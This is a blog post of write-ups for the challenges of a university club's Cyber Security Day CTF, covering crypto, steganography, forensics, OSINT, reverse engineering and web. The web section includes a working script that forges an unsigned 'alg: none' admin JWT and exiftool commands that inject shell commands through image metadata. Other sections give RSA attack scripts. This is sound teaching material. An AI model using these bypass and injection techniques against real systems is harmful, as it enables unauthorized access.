---
title: 'Cyber Security Day CTF'
published: 2024-11-11
description: ''
image: ''
tags: ['CTF', 'Crypto', 'Forensics', 'Misc', 'INSEC' ,'Steganography','Osint','Reverse','Web']
category: 'CTF'
draft: false 
---

Hello, I'm happy to share with you the writeups of the Cyber Security Day CTF challenges from the part of INSEC Club in collaboration with CYBERFORCES.
I am also happy to be a part of this as the author of the challenges except the WEB category that was created by WisePoo.

The CTF contains several categories like Crypto, Steganography, Forensics, Reverse Engineering, Misc, Web and Osint.



# Crypto 


## Primale
**description** : Math??? 2???

**given files** : finalchall.py

**solution** : In this challenge i implemented the closest primes vulnerability, which allow us to retreive the primes using fermat factorization theorem.

```python
import math
import gmpy2

def FermatFactor(n: int, max_steps: int):
    if n % 2 == 0:
        return 2, n // 2

    a = gmpy2.isqrt(n)

    if a * a == n:
        return a, a

    a += 1  # ceil(sqrt(n))
    b2 = a * a - n

    for _ in range(max_steps):
        if gmpy2.is_square(b2):
            return a + gmpy2.isqrt(b2), a - gmpy2.isqrt(b2)

        b2 += a
        a += 1
        b2 += a
    return None
n=27648324383538704058526126064664874691917638403593991242489099137877576182768193643164934381927043193856407292824729622322951353990162721990529414343175377852857689274876201528662203124227485748672303062548126194441400835928481251587783134278074665746682970354712955578800278168532406775145550549727181618513338094567283014138173235068565828630064627353801520155836164622254499802383985552509948534078768150613256802530977549344858089086996803357098914388837521106054470532422789702875346806977904108902499915266266843564027887867480322537174346831594998659778047946239498558452563855743282753795196712406941340754551
p,q=FermatFactor(n,2)
print(p,q)
```

And then you can decrypt the c to get the flag.

## Boxing-RSA
**description** : I heard that RSA has been under a massive break these days by chinese. Maybe you can make your place among them.

**given files** : finalchall.py | output.txt

**solution** : The challenge simply implement the wiener attack with a crt trick to recover e. The secret seed is the length of the random array, so we can recover e by appllying the CRT, and then use the weiner attack to find d.

```python
from sympy.ntheory.modular import crt
import random
def madness_rsndom():
    seedd = 2000 #len(hint)
    return [random.randint(1, seedd) for _ in range(seedd)]

def solve_for_e(hint):
    seedd = 2000 #len(hint)
    random.seed(seedd)
    moduli = madness_rsndom()

    # Hna khassek dir crt bach tjbed e
    e, _ = crt(moduli, hint)
    return e
hint =  [] # coller list hna
N =  # coller n hna
c =. # coller c hna 

e = solve_for_e(hint)

print(f"Solved value of e: {e}")

from Crypto.Util.number import getPrime, inverse, long_to_bytes, bytes_to_long
import math


def continued_fraction(numerator, denominator):
    cf = []
    while denominator:
        q = numerator // denominator
        cf.append(q)
        numerator, denominator = denominator, numerator - q * denominator
    return cf

def convergents(cf):

    convs = []
    for i in range(len(cf)):
        numerator = 1
        denominator = 0
        for j in reversed(cf[:i+1]):
            numerator, denominator = j * numerator + denominator, numerator
        convs.append((numerator, denominator))
    return convs

def wiener_attack(e, N):
   
    cf = continued_fraction(e, N)
    convs = convergents(cf)
    for k, d in convs:
        if k == 0:
            continue
        phi_n = (e * d - 1) // k
        b = N - phi_n + 1
        discriminant = b * b - 4 * N
        if discriminant >= 0:
            sqrt_discriminant = math.isqrt(discriminant)
            if sqrt_discriminant * sqrt_discriminant == discriminant:
                p = (b + sqrt_discriminant) // 2
                q = (b - sqrt_discriminant) // 2
                if p * q == N:
                    return d
    return None
recovered_d = wiener_attack(e, N)
print("d",recovered_d)
print(long_to_bytes(pow(c,int(recovered_d),N)))
```

## Metric-Encryption
**description** :  It's just a simple encryptoooo.

**given files** :  encryptoooo.py | flag.txt.enc

**solution** : This one was a little bit tricky Haha, it's a challenge that serves to encrypt a file using it's length merged with time-based crypto.
So the winning idea is to try to encrypt a fake file or a text file to conclude that the cipher text file is almost has the same length as the plain text file, with a small error ofc, and the second part of the challenge is to know the current time used which is simple to recover from the given cipher text using **exiftool** for example.

```python
s = 7121293 # cipher text length
f = open("flag.txt.enc","rb").read()
enc = int.from_bytes(f, byteorder='big')
for i in range(s-10,s+10):
    if enc%(i+1730510418)== 0:
        s=i+1730510418
        break
sol = int(enc//s)
f = open("sol","wb")
f.write(sol.to_bytes((sol.bit_length() + 7) // 8, byteorder='big'))
f.close()
```

## Cryptic-1
**description** : Two disks?, here is one INSECABDFGHJKLMOPQRTUVWXYZ .
Cipher = WQELORWMRVNYPKSSZSNVDXUYBXAXXKBQDAJWBXLXLLRDVGNZPACTBQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDGYQXFEAJNMWBUDMXBEGPKQJRLITFVYKQR

**solution** : In this challenge, as hinted in the description the cipher operating with two disks so searching a bit on dcode.fr you can find the CHAO cipher. using the first given disk for the two needed disks resulting decrypt the cipher. 
<img src="/favicon/chall9.png" alt="Back Image" style="width: 100vw;  object-fit: cover;">


## Cryptic-2
**description** : I heard that vegenere comes with its variants, so i decided to include palindromes utility in their keys .

Cipher : GIHKJVVCOCWGTRPKVFUOLNHGJVVCOCWRPYYCFCLLJLUUULVOSYKVEZEKSASVVSOSYXOHTUKHOLNNVESVVSASVVGJFSFMUEYHMSMAYKTMPPMUMPPMSZPBRGZIHFMFHDRGFUVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSARZUWWZIWSOGOVVWKEOFLICNGAVXRZBGOUMPVAXLQNCJGAVXRZBRKBVHFXOIOLPXRQVJVVPVZCBPSVVSASJVVCOCWRPHJOKSVZVSASVVSAGEIPKMPHVMMNPXDKOPMUMPPMUMNCMGRBCFMFHIEIRBIRASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVUWZWRCFBSJJLAVRNBTFGLZSGVYUWZWJLZMKYXCLLQZOGVYUWZWUHGVCIUTIJOMCRLYGAVKYWHBKVSASVVGAVXRZBRKKGTKNYWASVVSASVJBNPFPMMVHPKUXYNLUMPPMUMPPKHMBUYHFHIENEDUYNRVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSZWUZOHFWVGOLVYOSBOIDQZNJSDURCTOLUPHDXXOIVZJJSDURCTZHBYZNUOLGTMXUIDGVYHDWCEHASVVSAGVYUWZWUHPGONKDWVVSASVVSOBISCUMHYEUKPAVSLPPMUMPPMUKCPYZYCIENEIHAZYIUSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASUZREOCITAGJOSDONELN

**solution** : Also in this challenge, a variant of vigenere cipher on the show here, it is Beaufort cipher. So the first thing to do is to apply a kasiski test to know the length of key ( 5 ) and brute force the 2 first characters ( because of the palindrome utility ) and also the third character and search for INSEC in each iteration.

```python
cipher = """GIHKJVVCOCWGTRPKVFUOLNHGJVVCOCWRPYYCFCLLJLUUULVOSYKVEZEKSASVVSOSYXOHTUKHOLNNVESVVSASVVGJFSFMUEYHMSMAYKTMPPMUMPPMSZPBRGZIHFMFHDRGFUVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSARZUWWZIWSOGOVVWKEOF
LICNGAVXRZBGOUMPVAXLQNCJGAVXRZBRKBVHFXOIOLPXRQVJVVPVZCBPSVVSASJVVCOCWRPHJOKSVZVSASVVSAGEIPKMPHVMMNPXDKOPMUMPPMUMNCMGRBCFMFHIEIRBIRASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVUWZWRCFBSJJLAVRNBTF
GLZSGVYUWZWJLZMKYXCLLQZOGVYUWZWUHGVCIUTIJOMCRLYGAVKYWHBKVSASVVGAVXRZBRKKGTKNYWASVVSASVJBNPFPMMVHPKUXYNLUMPPMUMPPKHMBUYHFHIENEDUYNRVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSZWUZOHFWVGOLVYOSBOI
DQZNJSDURCTOLUPHDXXOIVZJJSDURCTZHBYZNUOLGTMXUIDGVYHDWCEHASVVSAGVYUWZWUHPGONKDWVVSASVVSOBISCUMHYEUKPAVSLPPMUMPPMUKCPYZYCIENEIHAZYIUSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASVVSASUZREOCITAGJOSDONELN"""

def decrypt_beaufort(ciphertext, key):
    alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    decrypted_message = ''

    key = key.upper()
    ciphertext = ciphertext.upper()

    key_length = len(key)
    key_index = 0

    for char in ciphertext:
        if char in alphabet:
            key_char = key[key_index % key_length]
            key_pos = alphabet.index(key_char)
            cipher_pos = alphabet.index(char)
            decrypted_pos = (key_pos - cipher_pos) % 26
            decrypted_message += alphabet[decrypted_pos]
            key_index += 1
        else:
            decrypted_message += char

    return decrypted_message

alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
for i in alphabet :
    for j in alphabet :
      for k in alphabet : 
        key = i+j+k+j+i
        plain = decrypt_beaufort(cipher, key)
        if "INSEC" in  plain :
              print(plain)

# key = CZHZC
```


# Steganography


## Encoded
**description** : A devoted admirer of the ZORO series once remarked, "ZORO'S HOME LIBRARY"

**given files** : challlevi.jpg

**solution** : Here the image contains a ZLIB file ( you can extract it using steghide ), This zlib file contains compressed base64. So we simply decompress the zlib and get the base64 data, after we can pass it to cyberchef website, the base64 encodes a base45 flag then this last contains brailles code, all can be done in CyberChef.

Here is how :
<img src="/favicon/chall1.png" alt="Back Image" style="width: 100vw;  object-fit: cover;">
<img src="/favicon/chall2.png" alt="Back Image" style="width: 100vw;  object-fit: cover;">

The flag is ```INSEC{V3RY_D33P_BR4ILLES}```.

# Scrambled
**description** : It's clearly not a scrambled file, but my machine tells me the opposite. 

**given files** : bruh

**solution** : This challenge is a text-steganography based challenge, searching a bit on text steganography you can find that we can hide informations in spaces using the Zero width technique. ( another way to do that is to inspect it in vim or a hex editor ). For us let's use this web online tool to reveil hidden data.
[tool](https://330k.github.io/misc_tools/unicode_steganography.html)
<img src="/favicon/chall3.png" alt="Back Image" style="width: 100vw;  object-fit: cover;">

as you can see the hidden data contains the flag but it's big and scrambled, the idea is to simply do a frequency calculation on the hidden text and recover the flag ( INSEC{n3w_Freq_7£ch_d15€oVRy} ).

```python
import matplotlib.pyplot as plt
import random
unique_text="""hidden text here"""
freq = {}
for char in unique_text:
    if char in freq:
        freq[char] += 1
    else:
        freq[char] = 1

letters, occurrences = zip(*sorted(freq.items(), key=lambda x: x[1], reverse=True))

plt.figure(figsize=(15, 5))
plt.bar(letters, occurrences)
plt.xlabel('Characters')
plt.ylabel('Occurrences')
plt.title('Character Frequency Analysis')
flag_indices = [letters.index(char) for char in flag]
plt.plot(flag_indices, [occurrences[i] for i in flag_indices], 'ro-', markersize=5, label='Flag Characters')
plt.legend()
plt.show()

print(unique_text)
```
By executing this you'll visualize the flag.
<img src="/favicon/chall4.png" alt="Back Image" style="width: 100vw;  object-fit: cover;">

## decentral
**description** :  What can make a difference is a little bit sticky.

**given files** : output.png

**solution** : As hinted in the description, decentral challenge image encode the flag in it's 4th bit of each pixel. so you can use stegsolve or a python script to get it.

```python
from PIL import Image

def decode_flag_from_jpg(image_path, flag_length):
    img = Image.open(image_path)
    pixels = img.load()

    binary_flag = ''
    bits_read = 0

    for y in range(img.height):
        for x in range(img.width):
            r, g, b = pixels[x, y]
            
            for channel in [r, g, b]:
                # Get the 4th bit directly
                channel_bits = format(channel, '08b')
                print(list(channel_bits))
                bit = channel_bits[3]  
                
                binary_flag += bit
                bits_read += 1
                
                if bits_read >= flag_length * 8: 
                    break
            if bits_read >= flag_length * 8:
                break
        if bits_read >= flag_length * 8:
            break
    decoded_flag = ''
    for i in range(0, len(binary_flag), 8):
        byte = binary_flag[i:i + 8]
        if len(byte) == 8:  # Ensure full byte
            decoded_flag += chr(int(byte, 2))

    return decoded_flag
hidden_flag = decode_flag_from_jpg('output.png', flag_length=90) 
print(hidden_flag) 
```


# Forensics


## QQR
**description** : I'm suffering with my broken QR, can you helpppp ?

**given files** : INSEC.png

**solution** : The idea of this challenge was simply replacing The 2 Upper position patterns to solve it, the second hard way is to build it from zero using CrazyBox online tool.

<img src="/favicon/chall5.png" alt="Back Image" style="width: 100vw;  object-fit: cover;">

## Broken-Satellite
**description** : Our satellites not doing great up there.

**given files** : satellitecomm.wav

**solution** : This transmission wav is called sstv transmission used for example by NASA to transmit images from space to earth. so as a classic challenge, you should decode it and get the flag using qsstv tool, but the transmission audio containing the image of the flag is merged with a fake flag audio, so the solution is to split the audio to two channels and then decode them to recover the flag.

You can use ffmpeg to split the audio channels, `ffmpeg -i satellitecomm.wav -ac 1 -map_channel 0.0.0 output_left.wav` 
`ffmpeg -i satellitecomm.wav -ac 1 -map_channel 0.0.1 output_right.wav`.

So now using qsstv on the each channels, 
<img src="/favicon/chall8.png" alt="Back Image" style="width: 100vw;  object-fit: cover;">
The flag is clear now.

## freepalestine
**description** : random.randint(1,6) tells you : don't even try do it the hard way

**given files** : freepalestine

**solution** : As hinted in the description, the freepalestine challenge contains two solutions, The hard way is to use Mersenne random generator vulnerability, the easiest way is to look for repeated sequences that means something. You'll find the seed value for the randomness and recover the image. 

First by passing it to xxd you can recognize that it's a png where it's hex bytes are repeated. 
<img src="/favicon/chall13.png" alt="Back Image" style="width: 100vw;  object-fit: cover;">

You'll recognize the seed value used to double the bytes embedded with exiftool.
```
000006666677788888899544443332222211111 = EUUULLLLAAAVVVDDDDEEEEESSSS
```
Note that it's reversed so after reverse the order you'll find ```seed value = 1234598760```, now we can use this seed to recover our reversed png.

```python
import random
def recover_png(file_path, seed_value, output_path):
    with open(file_path, "rb") as f:
        file_bytes = f.read()[::-1]

    print(f"pchhhhhh{len(file_bytes)} bytes")
    len(file_bytes)
    random.seed(seed_value)
    unmultipled_bytes = []
    i=0
    while i < len(file_bytes):
        rand_num = random.randint(1, 6)
        unmultipled_bytes.append(file_bytes[i])
        i+=rand_num
    with open(output_path, "wb") as out_f:
        out_f.write(bytearray(unmultipled_bytes))
    print(f"bekhhhhhh'{output_path}'")

file_path = "freepalestine" 
output_path = "recovered_image.png"
seed_value = 1234598760

recover_png(file_path, seed_value, output_path)
```

After getting the image we can use exiftool on it that give us a hint on using StegSolve to recover the flag.
<img src="/favicon/chall14.png" alt="Back Image" style="width: 100vw;  object-fit: cover;">


# Osint
## MyCastle-1
**description** : I'm trying to remember the name of the building in my left but it seems that i can't. Can you help. ex INSEC{Maria-Sol}

**given files** : chall.png

**solution** : The first challenge in Osint category consists of find the location of the given building. By submitting it in Google photos you can recognise the location of the right building to locate the left one.

## MyCastle-2
**description** : Recognize the plane, we need its Legall Airlines name, IATA name, IATA code and Region . ex INSEC{compagnienationaleroyalairmaroc_at_147_africa&middleeast}

**given files** :  plane.png

**solution** : This one, as described we need to recognise the plane, if you do you can build the flag.

So searching about the given plane will lead you to this awesome website of a photographer that has collected tails of several planes. [Website](https://airlinersgallery.smugmug.com/Airline-Tails/Airline-Tails).

So from this website you can conclude that the airline we are looking for is Croatia Airlines.
A small search about this plane and the needed values in the flag you'll get ```INSEC{croatiaairlines,inc._ou_831_europe}```.

## MyCastle-3
**description** : I used to travel a lot but this place is my favorite, Can you find the three words location from where i'm standing.
```Useful``` https://what3words.com/, Ex flag = INSEC{castle.break.lost}

**given files** : chall.png

**solution** : In this last challenge we are given an image of the moai in the Easter island, So we can recognize that the given statue is a part of ```Ahu Tongariki```. So searching on the given 3 words website, you can try all possible combinations from where the image was taken and get the flag ```INSEC{disadvantages.workout.expands}```.
<img src="/favicon/chall11.png" alt="Back Image" style="width: 100vw;  object-fit: cover;">


# Misc
## Suspect-Net-007
**description** : Have you heard about exfiltration?

**given files** : netw.pcapng

**solution** : In this networking challenge, you are given a pcapng traffic file to exfiltrate. Investigating a little bit in it, you can find weird ICMP packets used to test communication so analysing these packets you can conclude that the first ICMP packet contains 2 bytes of base64 after it is followed by 9 fake packets and so on. Note that the time difference will help you to do that.
<img src="/favicon/chall6.png" alt="Back Image" style="width: 100vw;  object-fit: cover;">

so reassemble the base64 bytes will give us ```SU5TRUN7cDFuOV9wMW45X2QxZF95b3VfbDFrM18zeGYxbDdyNDcxMG59``` base64 

## Suspect-Net-008
**description** : Alert! Our SOC team managed to detect some malicious activities on our network. Can you help them figure out what is about?

**given files** : netw.pcapng

**solution** : This challenge also contain ICMP packets exfiltration, This time you should analyse the TTL section of each packet and you'll see something unusuall, TTL contains the ascii code ord of each byte of the flag, so reassemble them give us the flag.
<img src="/favicon/chall7.png" alt="Back Image" style="width: 100vw;  object-fit: cover;">

## Resolution
**description** : My little brother is trying to learn about barcodes, but he found a different barcode format that he can't recognize. Can you find out what was that?

**given files** : secreeet.png

**solution** : From the image given in this chall, it is a splited barcode to four parts vertically, so the solution is to parse each and merge the four parts together, but multiple concatination possibilities will be there, so we can bruteforce them. So after generating the 16 images you can test them in an online decoder to decode the barcode.

Here is the solution : 

```python
from PIL import Image
import itertools

stacked_image = Image.open('secreeet.png')
stacked_width, stacked_height = stacked_image.size
part_height = stacked_height // 4
parts = [stacked_image.crop((0, i * part_height, stacked_width, (i + 1) * part_height)) for i in range(4)]
parts=list(itertools.permutations(parts))

restored_image = Image.new('RGB', (stacked_width * 4, part_height))


for j in range(len(parts)):
      for i, part in enumerate(parts[j]):
           restored_image.paste(part, (i * stacked_width, 0))


      restored_image.save(f'restored_barcode_{j}.png')

```


# Reverse Enginnering
## e_asm
**description** : Some basic ASSEMBLY as a warmup.

**given files** : chall

**solution** :

```python
import struct
flag = list(b"INSEC{") + [0] * 12 + [ord('}'), 0]
flag[6:10] = struct.pack("<I", 1870225259)  # 4 bytes
eax = 3738091242
eax = ((eax >> 1) | (eax << 31)) & 0xFFFFFFFF  # ror eax, 1
flag[10:14] = struct.pack("<I", eax)
eax = 2342557323
eax = eax ^ 0xFFFFFFFF  # XOR with 0xFFFFFFFF
eax = struct.unpack("<I", struct.pack(">I", eax))[0]  # BSWAP
flag[14:18] = struct.pack("<I", eax)
flag_bytes = b''.join([bytes([x]) if isinstance(x, int) else x for x in flag])
flag_str = flag_bytes.decode("latin-1").strip('\x00')

print(f"Recovered flag: {flag_str}")
```

## MajoorCost
**description** : Lets find whether you can beat my bin to find the right two numbers. Just Remember to return from the function and use nops to fill in any gaps. INSEC{uppercase hex values of the 5 bytes necessary to win it}

**given files** : major.exe

**solution** : 
YOU MAY RECOGNISE that the given file is a 32 bit c++ binary (windows). Use IDA or Cutter.

```cpp
int main()
{
  int num;
  LPVOID lpAddress;
  DWORD flOldProtect;
  int savedregs;

  flOldProtect = 0;
  lpAddress = &write_here;
  VirtualProtect(&write_here, 8u, 0x40u, &flOldProtect);
  scanf("%d %d", lpAddress, lpAddress + 4);     // write 2 numbers to `write_here` location
  num = 1;
  check_stack(&savedregs, &tmp_pptr);
  return 0;
}
```

The place of ```write_here``` is part of main function so jumping to it will give us a ```scanf``` call. 

```
.text:0045D22B 51                                   push    ecx
.text:0045D22C 68 68 DE 50 00                       push    offset format   ; "%d %d"
.text:0045D231 E8 1E C6 FF FF                       call    scanf
.text:0045D231
.text:0045D236 83 C4 0C                             add     esp, 0Ch
.text:0045D236
.text:0045D239
.text:0045D239                      write_here:                             ; DATA XREF: main+2F↑o
.text:0045D239 C7 45 DC 06 00 00 00                 mov     [ebp+num], 6
.text:0045D240 BB C3 08 00 00                       mov     ebx, 8C3h
```

As you see we need to enter 8 bytes winner code, Then you can recognise the "Congratulations" in strings, and by xrefs get to function ```sub_45D0B0```

```
.text:0045D0D0 6A 00                                push    0               ; uType
.text:0045D0D2 68 50 DE 50 00                       push    offset Caption  ; "Win"
.text:0045D0D7 68 54 DE 50 00                       push    offset Text     ; "Congratulations"
.text:0045D0DC 6A 00                                push    0               ; hWnd
.text:0045D0DE FF 15 BC 71 53 00                    call    ds:__imp_MessageBoxA
```

So we need to call ```sub_45D0B0``` function in the way that program doesn't crash.
We can do something like this by filling nops as I gives you in the description of the challenge.

```
E8 72 FE FF FF        call sub_45D0B0
90                    nop                   ; use nops to fill in any gaps
90                    nop                   ; use nops to fill in any gaps
BB                    db BBh                ; do not change the byte, so as it didn't crash
```

We need to enter 2 numbers: 4294865640(0xFFFE72E8) and 3146813695(0xBB9090FF) ==> Win
Sum of this num is hex(0xFFFE72E8+0xBB9090FF) = 1BB8F03E7
Flag is INSEC{1BB8F03E7}


# WEB

The challenges in this categorie is made by WisePoo, big thanks to him.

## CyberVault API Gateway - APISA challenge

### Challenge Overview
The challenge presents a web application with an API gateway that uses JWT (JSON Web Tokens) for authentication. The goal is to retrieve a flag by making a specific API request with the correct parameters.

###  Analysis

**Initial Reconnaissance**
The application has two main endpoints:
- `/` - Provides a web interface that issues guest JWT tokens
- `/api/request` - The main API endpoint requiring specific parameters

**Key Vulnerabilities**

- **JWT Header Manipulation**
The `verify_token()` function has interesting validation requirements for the JWT header. The header must contain specific pirate-themed values and meet certain format requirements.

- **Timestamp XOR Logic**
There's a specific timestamp validation using XOR operations that must be satisfied for the request to be accepted.

### Exploitation Steps

1. **Craft the JWT Header**
We need to create a JWT with specific header values that include pirate-themed strings and specific algorithm settings. The header must contain:
- A "typ" field with a specific pirate HMAC reference
- An "alg" field set to "none"
- A "kid" field with a pirate hash reference

2. **Calculate the Correct Timestamp**
The timestamp must satisfy a specific XOR operation with magic numbers:
- XOR with 0xCAFEBABE
- AND with 0xDEADBEEF
- Result must not be zero

3. **Prepare the JWT Payload**
The payload must include:
- Admin role
- The calculated timestamp

4. **Required Headers**
The request must include several specific headers:
- `X-Request-Timestamp`: The calculated timestamp
- `X-API-Version`: Must be 1.0
- `Authorization`: Bearer token with our crafted JWT
- `X-Content-Hash`: SHA256 hash of the sorted JSON body
- `Content-Type`: application/json

5. **API Request Body**
The request body must be a JSON object containing:
- action: "read"
- resource: "document"
- options.type: "admin"

### Flag Retrieval
When all conditions are met correctly, the server responds with the flag in the format `CSD{....}`.

Python script to automate the process:

```python
    import jwt
    import time
    import hashlib
    import json
    import requests

    # Target URL
    BASE_URL = "URL"

    # Find valid timestamp
    def find_valid_timestamp():
        current = int(time.time())
        while not ((current ^ 0xCAFEBABE) & 0xDEADBEEF):
            current += 1
        return current

    # Create JWT
    header = {
        "typ": "JWT with Why do pirates use HMAC?",
        "alg": "none",
        "kid": "What's a pirate's favorite hash?"
    }

    timestamp = find_valid_timestamp()
    payload = {
        "role": "admin",
        "timestamp": str(timestamp)
    }

    token = jwt.encode(payload, None, algorithm=None, headers=header)

    # Prepare request body
    body = {
        "action": "read",
        "resource": "document",
        "options": {
            "type": "admin"
        }
    }

    # Calculate content hash
    content_hash = hashlib.sha256(json.dumps(body, sort_keys=True).encode()).hexdigest()

    # Prepare headers
    headers = {
        "Authorization": f"Bearer {token}",
        "X-Request-Timestamp": str(timestamp),
        "X-API-Version": "1.0",
        "X-Content-Hash": content_hash,
        "Content-Type": "application/json"
    }

    # Make the request
    try:
        response = requests.post(f"{BASE_URL}api/request", headers=headers, json=body)
        print("\nResponse Status:", response.status_code)
        print("Response Body:", response.text)
    except requests.exceptions.RequestException as e:
        print(f"Error making request: {e}")

    # Print debug information
    print("\nDebug Information:")
    print(f"Token: {token}")
    print(f"Timestamp: {timestamp}")
    print(f"Content-Hash: {content_hash}")
```

## Galaxy CTF Write-up

### Initial Enumeration

1. On the main page, we find a base64 encoded message in the HTML comments:

   ```html
   <!-- 
     Lost in space? Perhaps a puzzle will guide you.
     Solve the puzzle in /img/puzzle.jpg — Black to move.
     Replace "XX" in this cryptic text with the correct tile: 
     Q2hlY2sgNDA0LnBocCB5b3UgbWF5IGZpbmQgd2hhdCB5b3UgYXJlIGxvb2tpbmcgZm9yIXX=
   -->
   ```

2. We solve the puzzle in `/img/puzzle.jpg` and get `C4` as the solution.

3. Decoding the base64 string:
   ```
   Q2hlY2sgNDA0LnBocCB5b3UgbWF5IGZpbmQgd2hhdCB5b3UgYXJlIGxvb2tpbmcgZm9yIC4=
   ```
   Decodes to: "Check 404.php you may find what you are looking for!"

4. Visiting 404.php reveals a hint about connecting to the admin center:
   ```html
   <!-- 
   To add "404.php", connect to the admin center.
   -->
   ```

5. Directory enumeration reveals `/adminarea/`

### Admin Panel Access

1. At the login page, we find a comment in the source code:
   ```html
   <!-- The password is hidden. Check the error page. -->
   ```

2. By triggering the error page with `?error=true`, we get the password:
   - Password: `w0rdc0unt123`

3. Using `admin` as username allows access to the admin dashboard.

### File Upload Exploitation

1. In the admin panel, there's a "Mission Logs" section that allows image uploads with the following restrictions:
   ```html
   <!-- The application accepts JPG/JPEG/TIFF files only. -->
   ```
   We notice that there's an empty description field for each image.

### Getting the Flag

1. Create a malicious JPEG with command injection in its metadata:
   ```bash
   exiftool -ImageDescription="ls" image.jpg
   ```
   This lists the files in the webapp directory, revealing a binary named `findaas` in the `bin` directory.

2. Use the `findaas` binary to locate the flag file:
   ```bash
   exiftool -ImageDescription="echo 'flag' | ./bin/findaas" image.jpg
   ```

3. Flag location discovered at:
   `/Space/is/where/existence/takes/shape/flag.txt`

4. Read the flag by creating another image:
   ```bash
   exiftool -ImageDescription="cat /Space/is/where/existence/takes/shape/flag.txt" image.jpg
   ```

5. Flag obtained: `CSD{1nj3ct10n_15_p41nfu1}`
